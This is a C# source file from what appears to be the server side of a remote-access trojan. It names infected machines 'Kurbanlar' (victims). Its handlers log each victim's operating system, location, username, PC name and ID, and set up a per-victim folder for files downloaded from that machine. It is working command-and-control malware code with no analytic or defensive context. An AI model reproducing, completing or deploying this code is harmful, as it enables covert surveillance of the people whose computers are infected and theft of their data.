using System.IO;
using System.Windows.Forms;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.KuuhakuCekirdek.Paketler.ClientPaketleri;
using xServer.KuuhakuCekirdek.Paketler.ServerPaketleri;
using xServer.KuuhakuCekirdek.Veri;
using xServer.KuuhakuCekirdek.Yardımcılar;
using xServer.Formlar;

namespace xServer.KuuhakuCekirdek.Eylemler
{
    public static partial class Eylemİşleyicisi
    {
        public static void HandleGetAuthenticationResponse(Client client, GetAuthenticationResponse packet)
        {
            if (client.EndPoint.Address.ToString() == "255.255.255.255" || packet.Id.Length != 64)
                return;

            try
            {
                client.Value.Versiyon = packet.Version;
                client.Value.IşletimSistemi = packet.OperatingSystem;
                client.Value.HesapTürü = packet.AccountType;
                client.Value.Ülke = packet.Country;
                client.Value.ÜlkeKodu = packet.CountryCode;
                client.Value.Bölge = packet.Region;
                client.Value.Şehir = packet.City;
                client.Value.Id = packet.Id;
                client.Value.KullanıcıAdi = packet.Username;
                client.Value.PcAdi = packet.PCName;
                client.Value.Etiket = packet.Tag;
                client.Value.ImageIndex = packet.ImageIndex;

                client.Value.DownloadDirectory = (!DosyaYardımcısı.CheckPathForIllegalChars(client.Value.KullanıcıPcde))
                    ? Path.Combine(Application.StartupPath,
                        string.Format("Kurbanlar\\{0}_{1}\\", client.Value.KullanıcıPcde, client.Value.Id.Substring(0, 7)))
                    : Path.Combine(Application.StartupPath,
                        string.Format("Kurbanlar\\{0}_{1}\\", client.EndPoint.Address, client.Value.Id.Substring(0, 7)));

                if (Ayarlar.ShowToolTip)
                    new GetSystemInfo().Execute(client);
            }
            catch
            {
            }
        }

        public static void HandleSetStatus(Client client, SetStatus packet)
        {
            AnaForm.Instance.KurbanDurumuAyarla(client, packet.Message);
        }

        public static void HandleSetUserStatus(Client client, SetUserStatus packet)
        {
            AnaForm.Instance.ClientleKurbanDurumuAyarla(client, packet.Message);
        }
    }
}